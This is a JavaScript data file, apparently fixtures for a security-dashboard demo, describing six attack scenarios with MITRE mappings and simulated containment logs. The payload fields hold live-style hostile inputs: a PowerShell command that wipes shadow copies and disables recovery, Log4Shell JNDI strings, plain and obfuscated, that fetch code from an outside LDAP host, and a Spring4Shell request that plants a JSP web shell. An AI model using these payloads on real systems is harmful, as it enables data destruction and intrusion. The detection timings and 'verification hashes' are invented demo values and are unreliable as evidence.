/**
 * AEGIS-X Threat Intelligence & Attack Laboratory Scenarios
 * Deep, production-grade cybersecurity profiles covering real CVEs, actual network payloads,
 * realistic packet hex dumps, MITRE ATT&CK mappings, and kernel containment receipts.
 */

export const ATTACK_SCENARIOS = [
  {
    id: 'LOCKBIT-3',
    key: 'RANSOMWARE',
    name: 'LockBit 3.0 Ransomware (Black)',
    shortName: 'LockBit 3.0 Ransomware',
    badge: 'CRITICAL',
    cve: 'CVE-2023-27532 / T1486',
    cvss: '9.8 / CRITICAL',
    actor: 'LockBit Supp / Bitwise Spider (RaaS)',
    category: 'Ransomware / Host Destruction',
    targetAsset: 'corp-ad-dc01.internal (10.240.10.4)',
    attackerIp: '10.240.15.89',
    attackerAsn: 'Internal Compromised Workstation (Subnet 15)',
    killChainStage: 4, // 5. Exfiltration / Impact
    killChainName: 'Exfiltration / Impact',
    targetPort: 445,
    protocol: 'SMB / RPC',
    threatScore: 98,
    mttc: '0.82s',
    overview:
      'LockBit 3.0 uses multithreaded AES-256-GCM encryption combined with privilege escalation via token impersonation. Upon execution, it wipes volume shadow copies using vssadmin and WMI, disables Windows Defender tamper protection, and systematically encrypts local and network-attached SMB shares.',
    infectionChain: [
      '1. Initial foothold gained via stolen VPN credentials (10.240.15.89).',
      '2. Privilege escalation via SeDebugPrivilege token stealing.',
      '3. Invocation of WMI and PowerShell to purge volume shadow copies.',
      '4. Multithreaded file encryption with .lockbit extension append.',
      '5. AEGIS-X autonomous anomaly scoring triggered at 150 ops/sec.',
      '6. Kernel host quarantine enforced via iptables & endpoint agent severed.',
    ],
    payload: `powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete(); }; bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures; bcdedit.exe /set {default} recoveryenabled no; vssadmin.exe delete shadows /all /quiet"`,
    hexDump: `00000000  4d 5a 90 00 03 00 00 00  04 00 00 00 ff ff 00 00  |MZ..............|
00000010  b8 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00  |........@.......|
00000020  76 73 73 61 64 6d 69 6e  2e 65 78 65 20 64 65 6c  |vssadmin.exe del|
00000030  65 74 65 20 73 68 61 64  6f 77 73 20 2f 61 6c 6c  |ete shadows /all|
00000040  20 2f 71 75 69 65 74 00  2e 6c 6f 63 6b 62 69 74  | /quiet..lockbit|
00000050  53 68 61 64 6f 77 43 6f  70 79 44 65 6c 65 74 65  |ShadowCopyDelete|`,
    mitre: {
      tacticId: 'TA0040',
      tactic: 'Impact',
      techniqueId: 'T1486',
      technique: 'Data Encrypted for Impact',
      subTechnique: 'T1490 (Inhibit System Recovery)',
      defenseEvasion: 'T1562.001 (Disable Security Tools)',
    },
    resolutionSteps: [
      { step: 'Anomaly Trigger', text: 'Heuristic write burst > 150 files/sec & Shannon Entropy 7.96 detected.', time: 'T+0.12s' },
      { step: 'Neural Classification', text: 'AI Model classified RANSOMWARE_ENCRYPTION_STRIKE (Confidence: 99.8%).', time: 'T+0.28s' },
      { step: 'Autonomous IPS Sever', text: 'Kernel iptables DROP enforced for 10.240.15.89; SMB ports 445/139 isolated.', time: 'T+0.45s' },
      { step: 'SOAR Playbook PB-01', text: 'Endpoint agent signaled: Process tree terminated (PID: 4921); snapshot state frozen.', time: 'T+0.68s' },
      { step: 'Containment Sealed', text: 'Cryptographic incident record generated. Zero domain controller encryption.', time: 'T+0.82s' },
    ],
    kernelCommand: 'iptables -I FORWARD -s 10.240.15.89 -j DROP && iptables -I INPUT -s 10.240.15.89 -j DROP',
    verificationHash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
  },

  {
    id: 'LOG4SHELL-JNDI',
    key: 'LOG4J',
    name: 'Apache Log4Shell JNDI Remote Code Execution',
    shortName: 'Log4Shell 0-Day (CVE-2021-44228)',
    badge: 'CRITICAL',
    cve: 'CVE-2021-44228 / CVE-2021-45046',
    cvss: '10.0 / CRITICAL (CVSS:3.1)',
    actor: 'Lazarus / Threat Actors Worldwide',
    category: 'Zero-Day RCE / JNDI Injection',
    targetAsset: 'k8s-ingress-proxy.dmz (10.240.10.12)',
    attackerIp: '185.220.101.5',
    attackerAsn: 'AS9009 Tor Exit Relay (Frankfurt, DE)',
    killChainStage: 1, // 2. Exploitation
    killChainName: 'Exploitation / Weaponization',
    targetPort: 8080,
    protocol: 'HTTP / LDAP',
    threatScore: 95,
    mttc: '0.48s',
    overview:
      'Log4Shell leverages insecure JNDI lookup resolution in Apache Log4j 2.x. Attackers inject ${jndi:ldap://...} strings into arbitrary HTTP headers (User-Agent, X-Forwarded-For, URI query). The server parses the log format, reaches out to the attacker LDAP server, deserializes remote Java bytecode, and executes arbitrary shell code.',
    infectionChain: [
      '1. Attacker sends HTTP GET with obfuscated JNDI payload in User-Agent header.',
      '2. Web application passes header string to log4j.logger.info().',
      '3. Log4j JNDI plugin triggers outbound LDAP connection to rogue listener (185.220.101.5:1389).',
      '4. AEGIS-X DPI engine intercepts packet and unpacks recursive string obfuscation.',
      '5. Active TCP RST injected; perimeter IP blackholed at edge proxy.',
      '6. Zero Java class execution permitted.',
    ],
    payload: `GET /login HTTP/1.1\r\nHost: api.enterprise.corp\r\nUser-Agent: \${jndi:ldap://185.220.101.5:1389/ExploitObject.class}\r\nX-Forwarded-For: \${lower:j}\${lower:n}\${lower:d}\${lower:i}:\${lower:l}\${lower:d}ap://185.220.101.5:1389/ExploitObject.class\r\nAccept: */*\r\n\r\n`,
    hexDump: `00000000  47 45 54 20 2f 6c 6f 67  69 6e 20 48 54 54 50 2f  |GET /login HTTP/|
00000010  31 2e 31 0d 0a 55 73 65  72 2d 41 67 65 6e 74 3a  |1.1..User-Agent:|
00000020  20 24 7b 6a 6e 64 69 3a  6c 64 61 70 3a 2f 2f 31  | \${jndi:ldap://1|
00000030  38 35 2e 32 32 30 2e 31  30 31 2e 35 3a 31 33 38  |85.220.101.5:138|
00000040  39 2f 45 78 70 6c 6f 69  74 4f 62 6a 65 63 74 2e  |9/ExploitObject.|
00000050  63 6c 61 73 73 7d 0d 0a  0d 0a                    |class}....      |`,
    mitre: {
      tacticId: 'TA0002',
      tactic: 'Execution',
      techniqueId: 'T1190',
      technique: 'Exploit Public-Facing Application',
      subTechnique: 'T1059 (Command and Scripting Interpreter)',
      defenseEvasion: 'T1027 (Obfuscated Files or Information)',
    },
    resolutionSteps: [
      { step: 'DPI Protocol Match', text: 'Regex signature ET EXPLOIT Apache Log4j JNDI RCE matched in HTTP stream.', time: 'T+0.04s' },
      { step: 'De-obfuscation Engine', text: 'Unpacked nested ${lower:j}${lower:n} string into canonical URI: ldap://185.220.101.5:1389.', time: 'T+0.11s' },
      { step: 'TCP RST Injection', text: 'Bilateral TCP Reset sent to client and server socket; connection terminated.', time: 'T+0.19s' },
      { step: 'Gateway Ban', text: 'External Tor IP 185.220.101.5 banned for 86,400s at perimeter gateway.', time: 'T+0.32s' },
      { step: 'Incident Closed', text: 'Payload rejected with 0-byte memory impact on application tier.', time: 'T+0.48s' },
    ],
    kernelCommand: 'iptables -I INPUT -p tcp -s 185.220.101.5 --dport 8080 -j DROP && ipset add blacklist 185.220.101.5',
    verificationHash: '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4',
  },

  {
    id: 'COBALT-STRIKE-C2',
    key: 'COBALT_STRIKE',
    name: 'Cobalt Strike Malleable C2 Beacon',
    shortName: 'Cobalt Strike C2 (APT29)',
    badge: 'HIGH',
    cve: 'MITRE T1071.001 / APT29',
    cvss: '8.8 / HIGH',
    actor: 'APT29 (Cozy Bear / Nobelium)',
    category: 'Command & Control / Covert Channel',
    targetAsset: 'db-cust-vault.prod (10.240.20.88)',
    attackerIp: '45.33.32.156',
    attackerAsn: 'AS4134 Chinanet (Beijing, CN)',
    killChainStage: 3, // 4. C2 Beaconing
    killChainName: 'Command & Control',
    targetPort: 443,
    protocol: 'HTTPS / Malleable C2',
    threatScore: 89,
    mttc: '0.94s',
    overview:
      'The Cobalt Strike Beacon payload establishes low-and-slow encrypted HTTPS/DNS channels disguised as benign analytics telemetry. It uses custom Malleable C2 profiles with sleep timers and jitter to evade threshold-based perimeter defenses, extracting host enumeration data and awaiting interactive tasking.',
    infectionChain: [
      '1. Host infected via spearphishing document payload.',
      '2. Beacon spawns rundll32.exe and injects shellcode into memory.',
      '3. Encrypted periodic heartbeat sent to 45.33.32.156 with 30s jittered sleep.',
      '4. AEGIS-X Fast Fourier Transform (FFT) analysis identifies recurring periodicity.',
      '5. Autonomous DNS sinkhole redirect applied, severing operator control.',
      '6. Rogue C2 server null-routed across internal edge routing table.',
    ],
    payload: `POST /analytics/v2/metrics HTTP/1.1\r\nHost: telemetry-service-cdn.org\r\nCookie: __cf_bm=4hJkL99mNqQ12vXy...[AES-256 Encrypted Host Metadata]\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\nContent-Length: 128\r\n\r\n[Encrypted Beacon Heartbeat: Sleep=30s, Jitter=15%, Architecture=x64, PID=3812]`,
    hexDump: `00000000  50 4f 53 54 20 2f 61 6e  61 6c 79 74 69 63 73 2f  |POST /analytics/|
00000010  76 32 2f 6d 65 74 72 69  63 73 20 48 54 54 50 2f  |v2/metrics HTTP/|
00000020  31 2e 31 0d 0a 48 6f 73  74 3a 20 74 65 6c 65 6d  |1.1..Host: telem|
00000030  65 74 72 79 2d 73 65 72  76 69 63 65 2d 63 64 6e  |etry-service-cdn|
00000040  2e 6f 72 67 0d 0a 43 6f  6f 6b 69 65 3a 20 5f 5f  |.org..Cookie: __|
00000050  63 66 5f 62 6d 3d 34 68  4a 6b 4c 39 39 6d 4e 71  |cf_bm=4hJkL99mNq|`,
    mitre: {
      tacticId: 'TA0011',
      tactic: 'Command and Control',
      techniqueId: 'T1071.001',
      technique: 'Application Layer Protocol: Web Protocols',
      subTechnique: 'T1573.002 (Asymmetric Cryptography)',
      defenseEvasion: 'T1055.001 (Dynamic-link Library Injection)',
    },
    resolutionSteps: [
      { step: 'FFT Periodicity Analysis', text: 'Fast Fourier Transform confirmed synthetic beaconing pattern (Interval: 30s ± 4.5s).', time: 'T+0.18s' },
      { step: 'Entropy Calculation', text: 'Payload randomness score 7.92 confirms high-grade encryption wrapper.', time: 'T+0.32s' },
      { step: 'DNS Sinkhole Enforced', text: 'telemetry-service-cdn.org sinkholed to 127.0.0.1 on CoreDNS probe.', time: 'T+0.52s' },
      { step: 'Host Quarantine', text: 'Database server 10.240.20.88 isolated from untrusted internet egress.', time: 'T+0.74s' },
      { step: 'Remediation Verified', text: 'No C2 tasking received; reverse shell aborted.', time: 'T+0.94s' },
    ],
    kernelCommand: 'iptables -A OUTPUT -d 45.33.32.156 -j REJECT --reject-with icmp-net-prohibited',
    verificationHash: '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8',
  },

  {
    id: 'KERBEROASTING-AD',
    key: 'KERBEROAST',
    name: 'Active Directory Kerberoasting Privilege Escalation',
    shortName: 'AD Kerberoasting Attack',
    badge: 'HIGH',
    cve: 'MITRE T1558.003 / Active Directory',
    cvss: '8.2 / HIGH',
    actor: 'FIN7 / Insider Threat / Lateral Pivoter',
    category: 'Credential Access / Privilege Escalation',
    targetAsset: 'corp-ad-dc01.internal (10.240.10.4)',
    attackerIp: '10.240.15.22',
    attackerAsn: 'Internal Corporate Subnet (Workstation WS-22)',
    killChainStage: 2, // 3. Lateral Pivot
    killChainName: 'Lateral Pivot',
    targetPort: 88,
    protocol: 'Kerberos / TCP',
    threatScore: 82,
    mttc: '1.05s',
    overview:
      'Kerberoasting is an attack where any authenticated domain user requests a Kerberos Ticket Granting Service (TGS) ticket for a Service Principal Name (SPN). Because the ticket is encrypted with the service account NTLM/RC4 password hash, the attacker extracts the ticket offline to crack the plaintext password with Hashcat.',
    infectionChain: [
      '1. Attacker uses compromised domain user account on WS-22.',
      '2. Enumerates SPNs in Active Directory using LDAP query (servicePrincipalName=*).',
      '3. Requests TGS tickets using RC4-HMAC cipher for high-privilege service accounts.',
      '4. AEGIS-X behavioral engine detects abnormal ticket request spike (14 tickets in 12 seconds).',
      '5. SOAR Playbook PB-04 triggers automatic AD account lockout and Kerberos session kill.',
      '6. Lateral privilege escalation thwarted.',
    ],
    payload: `KRB_TGS_REQ (Kerberos v5 Request)
User: CORP\\j.doe (10.240.15.22)
Requested SPN: MSSQLSvc/db-prod-cluster.corp:1433
Cipher: RC4-HMAC (0x17) [Legacy Weak Encryption]
Extracted Hash: $krb5tgs$23$*MSSQLSvc/db-prod-cluster.corp*$92f8b0112a874c93f0b24017...`,
    hexDump: `00000000  6e 82 04 21 30 82 04 1d  a0 03 02 01 05 a1 03 02  |n..!0...........|
00000010  01 0c a2 07 03 05 00 10  00 00 00 a3 82 03 eb 30  |...............0|
00000020  82 03 e7 30 82 03 e3 a0  07 03 05 00 40 00 00 00  |...0........@...|
00000030  a1 1c 30 1a a0 03 02 01  01 a1 13 30 11 1b 04 43  |..0........0...C|
00000040  4f 52 50 1b 09 4d 53 53  51 4c 53 76 63 00 00 00  |ORP..MSSQLSvc...|`,
    mitre: {
      tacticId: 'TA0006',
      tactic: 'Credential Access',
      techniqueId: 'T1558.003',
      technique: 'Steal or Forge Kerberos Tickets: Kerberoasting',
      subTechnique: 'T1078.002 (Domain Accounts)',
      defenseEvasion: 'T1550.003 (Pass the Ticket)',
    },
    resolutionSteps: [
      { step: 'Velocity Spike Detected', text: '14 TGS requests for critical SPNs in 12s exceeded baseline (limit: 2/min).', time: 'T+0.22s' },
      { step: 'Weak Cipher Alert', text: 'RC4-HMAC (type 0x17) requested instead of AES-256-CTS; high likelihood of offline cracking.', time: 'T+0.38s' },
      { step: 'SOAR Account Revocation', text: 'User CORP\\j.doe Kerberos ticket granted invalidated via Active Directory REST hook.', time: 'T+0.65s' },
      { step: 'Network Quarantine', text: 'Port 88 (Kerberos) blocked from workstation 10.240.15.22.', time: 'T+0.85s' },
      { step: 'Resolution Verified', text: 'Hash extraction neutralized; zero domain admin compromise.', time: 'T+1.05s' },
    ],
    kernelCommand: 'iptables -I FORWARD -s 10.240.15.22 -p tcp --dport 88 -j REJECT --reject-with tcp-reset',
    verificationHash: '4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a',
  },

  {
    id: 'SPRING4SHELL-RCE',
    key: 'SPRING4SHELL',
    name: 'Spring4Shell DataBinder Web Shell Injection',
    shortName: 'Spring4Shell RCE (CVE-2022-22965)',
    badge: 'CRITICAL',
    cve: 'CVE-2022-22965 / Spring Framework',
    cvss: '9.8 / CRITICAL',
    actor: 'Automated Botnets & Nation-State APTs',
    category: 'Remote Code Execution / Web Shell',
    targetAsset: 'k8s-ingress-proxy.dmz (10.240.10.12)',
    attackerIp: '198.51.100.42',
    attackerAsn: 'AS16276 OVH SAS (Roubaix, FR)',
    killChainStage: 1, // 2. Exploitation
    killChainName: 'Exploitation',
    targetPort: 443,
    protocol: 'HTTPS / Spring MVC',
    threatScore: 94,
    mttc: '0.62s',
    overview:
      'Spring4Shell exploits parameter binding in Spring MVC applications running on JDK 9+. By traversing class.module.classLoader, the attacker overwrites Tomcat AccessLogValve properties to write an arbitrary JSP web shell into the root web directory, granting complete remote interactive terminal control.',
    infectionChain: [
      '1. Attacker sends HTTP POST with ClassLoader property manipulation strings.',
      '2. Targets Tomcat pipeline to rewrite log pattern, file suffix, and directory.',
      '3. Writes persistent backdoor: shell.jsp containing Runtime.getRuntime().exec().',
      '4. AEGIS-X WAF inspection intercepts class.module parameter traversal.',
      '5. Connection terminated with HTTP 403 Forbidden; IP banned across cluster.',
      '6. Zero files written to container filesystem.',
    ],
    payload: `POST /helloworld/greeting HTTP/1.1\r\nHost: portal.enterprise.corp\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nclass.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7Bjava.io.InputStream%20in%3DRuntime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B...%7D\r\n&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp\r\n&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT`,
    hexDump: `00000000  50 4f 53 54 20 2f 68 65  6c 6c 6f 77 6f 72 6c 64  |POST /helloworld|
00000010  2f 67 72 65 65 74 69 6e  67 20 48 54 54 50 2f 31  |/greeting HTTP/1|
00000020  2e 31 0d 0a 43 6f 6e 74  65 6e 74 2d 54 79 70 65  |.1..Content-Type|
00000030  3a 20 61 70 70 6c 69 63  61 74 69 6f 6e 2f 78 2d  |: application/x-|
00000040  77 77 77 2d 66 6f 72 6d  2d 75 72 6c 65 6e 63 6f  |www-form-urlenco|
00000050  64 65 64 0d 0a 0d 0a 63  6c 61 73 73 2e 6d 6f 64  |ded....class.mod|`,
    mitre: {
      tacticId: 'TA0002',
      tactic: 'Execution',
      techniqueId: 'T1190',
      technique: 'Exploit Public-Facing Application',
      subTechnique: 'T1505.003 (Web Shell)',
      defenseEvasion: 'T1036 (Masquerading)',
    },
    resolutionSteps: [
      { step: 'WAF Parameter Filter', text: 'Matched classLoader property access pattern: class.module.classLoader.*', time: 'T+0.08s' },
      { step: 'Heuristic Validation', text: 'Identified attempt to rewrite Tomcat AccessLogValve properties to write .jsp file.', time: 'T+0.16s' },
      { step: 'Inline Drop', text: 'HTTP 403 Forbidden generated; packet dropped at reverse proxy.', time: 'T+0.28s' },
      { step: 'Cluster Ban', text: 'IP 198.51.100.42 synchronized to all Envoy ingress gateways via Redis sync.', time: 'T+0.45s' },
      { step: 'Integrity Check', text: 'Web root filesystem integrity scan verified clean (0 unauthorized files).', time: 'T+0.62s' },
    ],
    kernelCommand: 'iptables -I INPUT -p tcp -s 198.51.100.42 --dport 443 -j DROP',
    verificationHash: 'ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d',
  },

  {
    id: 'MIRAI-SYN-FLOOD',
    key: 'SYN_FLOOD',
    name: 'Mirai Botnet Distributed SYN Flood (DDoS)',
    shortName: 'Mirai Botnet SYN Flood',
    badge: 'MEDIUM',
    cve: 'MITRE T1498.001 / Volumetric DDoS',
    cvss: '7.5 / HIGH',
    actor: 'Mirai IoT Botnet Cluster',
    category: 'Denial of Service / Resource Exhaustion',
    targetAsset: 'swift-financial-gw.prod (10.240.30.5)',
    attackerIp: '203.0.113.15 (Distributed Swarm)',
    attackerAsn: 'AS14061 DigitalOcean & 4,200 IoT Probes',
    killChainStage: 0, // 1. Recon / Initial Inundation
    killChainName: 'Reconnaissance / Flood',
    targetPort: 443,
    protocol: 'TCP SYN',
    threatScore: 76,
    mttc: '0.35s',
    overview:
      'Mirai botnets compromise vulnerable IoT cameras and routers, organizing them into a distributed reflector array. The swarm floods the target edge routers with forged TCP SYN packets with randomized window sizes, exhausting the TCP connection state table (conntrack) and starving legitimate traffic.',
    infectionChain: [
      '1. Attacker triggers distributed command to 4,200 botnet nodes.',
      '2. Ingress traffic spikes to 120,000 packets/sec on financial payment gateway.',
      '3. Linux conntrack table reaches 85% capacity in 1.5 seconds.',
      '4. AEGIS-X eBPF fast-path driver engages autonomous SYN Cookies (syncookies=1).',
      '5. Rate-limiting enforced at hardware NIC level via XDP filter.',
      '6. Zero connection drops for authenticated banking clients.',
    ],
    payload: `TCP Packet Trace:
Source IP: 203.0.113.15 -> Dest IP: 10.240.30.5:443
Flags: [SYN], Seq=284910291, Ack=0, Win=0 (Forged), Len=0
Traffic Velocity: 124,500 packets/sec (Normal Baseline: 1,800 pkts/sec)
SYN/ACK Ratio: 99.8% unacknowledged`,
    hexDump: `00000000  45 00 00 28 5d b1 40 00  40 06 b9 1a cb 00 71 0f  |E..(].@.@.....q.|
00000010  0a f0 1e 05 92 1a 01 bb  10 f9 a0 73 00 00 00 00  |...........s....|
00000020  50 02 00 00 f2 c7 00 00                           |P.......        |`,
    mitre: {
      tacticId: 'TA0040',
      tactic: 'Impact',
      techniqueId: 'T1498.001',
      technique: 'Direct Network Flood',
      subTechnique: 'T1499.001 (OS Exhaustion Flood)',
      defenseEvasion: 'T1584.005 (Botnet Infrastructure)',
    },
    resolutionSteps: [
      { step: 'eBPF Ingress Anomaly', text: 'Threshold alarm: 124,500 pps crosses 10,000 pps ceiling; SYN ratio 99.8%.', time: 'T+0.05s' },
      { step: 'Kernel SYN Cookies', text: 'XDP fast-path enabled syncookies to protect connection tracking tables.', time: 'T+0.12s' },
      { step: 'Hardware NIC Rate-Limit', text: 'NIC hardware policer throttled unauthenticated SYN rate to 500 pps.', time: 'T+0.20s' },
      { step: 'Upstream RTBH Signal', text: 'BGP Community blackhole advertised to upstream Tier-1 carrier.', time: 'T+0.28s' },
      { step: 'Service Restored', text: 'Gateway latency normalized to 1.8ms; zero downtime on SWIFT settlement bus.', time: 'T+0.35s' },
    ],
    kernelCommand: 'sysctl -w net.ipv4.tcp_syncookies=1 && tc qdisc add dev eth0 root handle 1: htb default 10',
    verificationHash: 'c4ca4238a0b923820dcc509a6f75849b00000000000000000000000000000000',
  },
];
